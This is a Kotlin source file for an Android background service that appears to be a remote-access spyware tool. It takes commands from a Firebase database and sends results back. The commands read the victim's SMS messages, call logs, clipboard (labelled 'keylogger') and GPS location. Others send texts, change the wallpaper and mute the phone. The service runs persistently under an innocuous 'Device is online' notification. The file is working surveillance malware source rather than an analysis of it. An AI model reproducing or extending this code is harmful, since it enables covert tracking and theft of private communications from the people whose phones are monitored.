package com.my.darkmatter

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.location.Location
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.Vibrator
import android.telephony.SmsManager
import android.content.pm.PackageManager
import android.Manifest
import android.location.LocationListener
import android.location.LocationManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.graphics.drawable.toBitmap
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import android.app.WallpaperManager
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.annotation.SuppressLint
import android.media.AudioManager
import android.provider.Telephony
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices

class BackgroundService : Service() {

    private lateinit var database: DatabaseReference
    private val deviceName = android.os.Build.MODEL
    private var vibrator: Vibrator? = null
    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var locationManager: LocationManager
    private lateinit var fusedLocationClient: FusedLocationProviderClient


    private val CHANNEL_ID = "com.my.darkmatter.notification_channel"
    private val CHANNEL_NAME = "Foreground Service Channel"

    override fun onCreate() {
        super.onCreate()
        database = FirebaseDatabase.getInstance().reference
        vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
        sharedPreferences = applicationContext.getSharedPreferences("MyAppPreferences", Context.MODE_PRIVATE)
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        val commandRef = database.child("Device").child(deviceName).child("command")
        commandRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                val command = snapshot.value as? String
                if (command != null) {
                    handleCommand(command)
                }
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })

        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        updateDeviceStatus(true)

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Status")
            .setContentText("Device is online.")
            .setSmallIcon(R.drawable.splash)
            .build()

        startForeground(1, notification)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        updateDeviceStatus(false)
    }

    private fun handleCommand(command: String) {
        when (command) {
            "battery" -> getBatteryInfo()
            "getLocation" -> getLocation()
            "online" -> sendOnlineStatus()
            "torchOn" -> turnTorchOn()
            "torchOff" -> turnTorchOff()
            "keylogger" -> getClipboardData()
            "vibrate" -> vibrateDevice()
            "sms" -> sendSMS()
            "changeWallpaper" -> changeWallpaper()
            "info" -> getDeviceInfo()
            "mute" -> muteDevice()
            "unmute" -> unmuteDevice()
            "storage" -> sendStorageInfo()
            "messages" -> sendMessages()
            "callLogs" -> sendCallLogs()
        }
    }

    private fun getBatteryInfo() {
        val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        sendResponseToFirebase("battery", "$batteryLevel%")
    }

    private fun getLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            sendResponseToFirebase("location", "Permission denied.")
            return
        }

        try {
            val locationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val locationData = "Lat: ${location.latitude}, Long: ${location.longitude}"
                    sendResponseToFirebase("location", locationData)
                    locationManager.removeUpdates(this)
                }

                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, locationListener, null)
        } catch (e: SecurityException) {
            sendResponseToFirebase("location", "Error: Permission Denied")
        }
    }

    private fun sendResponseToFirebase(key: String, value: String) {
        val responseRef = database.child("Device").child(deviceName).child("response")
        responseRef.setValue("$key: $value")
    }

    private fun sendOnlineStatus() {
        val statusRef = database.child("Device").child(deviceName).child("response")
        statusRef.setValue("status: online")
    }

    private fun turnTorchOn() {
        try {
            val camera = android.hardware.Camera.open()
            val parameters = camera.parameters
            parameters.flashMode = android.hardware.Camera.Parameters.FLASH_MODE_TORCH
            camera.parameters = parameters
            camera.startPreview()
            sendResponseToFirebase("torch", "on")
        } catch (e: Exception) {
            sendResponseToFirebase("torch", "error")
        }
    }

    private fun turnTorchOff() {
        try {
            val camera = android.hardware.Camera.open()
            val parameters = camera.parameters
            parameters.flashMode = android.hardware.Camera.Parameters.FLASH_MODE_OFF
            camera.parameters = parameters
            camera.stopPreview()
            sendResponseToFirebase("torch", "off")
        } catch (e: Exception) {
            sendResponseToFirebase("torch", "error")
        }
    }

    private fun getClipboardData() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clipData = clipboard.primaryClip?.getItemAt(0)?.text.toString()
        sendResponseToFirebase("clipboard", clipData)
    }

    private fun vibrateDevice() {
        if (vibrator?.hasVibrator() == true) {
            vibrator?.vibrate(5000)
            sendResponseToFirebase("vibrate", "started")
        } else {
            sendResponseToFirebase("vibrate", "error")
        }
    }

    private fun sendSMS() {
        val smsManager = SmsManager.getDefault()
        smsManager.sendTextMessage("1234567890", null, "This is a test SMS", null, null) // Replace with actual recipient
        sendResponseToFirebase("sms", "sent")
    }

    private fun changeWallpaper() {
        val wallpaperManager = WallpaperManager.getInstance(applicationContext)
        val wallpaperDrawable = resources.getDrawable(R.drawable.wallpaper) // Replace with actual wallpaper resource
        wallpaperManager.setBitmap(wallpaperDrawable.toBitmap())
        sendResponseToFirebase("wallpaper", "changed")
    }

    private fun getDeviceInfo() {
        val deviceInfo = """
            Brand: ${Build.BRAND}
            Model: ${Build.MODEL}
            Manufacturer: ${Build.MANUFACTURER}
            Android Version: ${Build.VERSION.RELEASE}
            SDK Version: ${Build.VERSION.SDK_INT}
        """.trimIndent()
        sendResponseToFirebase("device_info", deviceInfo)
    }

    private fun muteDevice() {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0) // Set media volume to 0
        sendResponseToFirebase("volume", "muted")
    }

    @SuppressLint("ServiceCast")
    private fun unmuteDevice() {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0) // Set media volume to max
        sendResponseToFirebase("volume", "unmuted")
    }

    private fun sendStorageInfo() {
        val storageInfo = getStorageInfo()
        sendResponseToFirebase("storage", storageInfo)
    }

    private fun getStorageInfo(): String {
        val stat = StatFs(Environment.getDataDirectory().absolutePath)
        val totalBytes = stat.blockCountLong * stat.blockSizeLong
        val availableBytes = stat.availableBlocksLong * stat.blockSizeLong
        val usedBytes = totalBytes - availableBytes
        return "Total: ${formatBytes(totalBytes)}, Used: ${formatBytes(usedBytes)}, Free: ${formatBytes(availableBytes)}"
    }

    private fun formatBytes(bytes: Long): String {
        val kb = 1024
        val mb = kb * 1024
        val gb = mb * 1024

        return when {
            bytes >= gb -> "${bytes / gb} GB"
            bytes >= mb -> "${bytes / mb} MB"
            bytes >= kb -> "${bytes / kb} KB"
            else -> "$bytes Bytes"
        }
    }

    @SuppressLint("Range")

    private fun sendMessages() {
        val messagesList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < 10) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS)) ?: "Unknown"
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY)) ?: "No message"
                messagesList.add(mapOf("address" to address, "body" to body))
                count++
            }
        }

        // Send actual messages directly to the response node
        sendResponseToFirebase("messages", messagesList.toString())
    }


    @SuppressLint("Range")
    private fun sendCallLogs() {
        val callLogs = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER)

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < 10) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: "Unknown"
                val type = it.getString(it.getColumnIndex(CallLog.Calls.TYPE)) ?: "Unknown"
                callLogs.add(mapOf("number" to number, "type" to type))
                count++
            }
        }

        // Send actual call logs directly to the response node
        sendResponseToFirebase("call_logs", callLogs.toString())
    }


    private fun updateDeviceStatus(isOnline: Boolean) {
        database.child("Device").child(deviceName).child("status").setValue(if (isOnline) "online" else "offline")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationChannel = NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT)
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(notificationChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
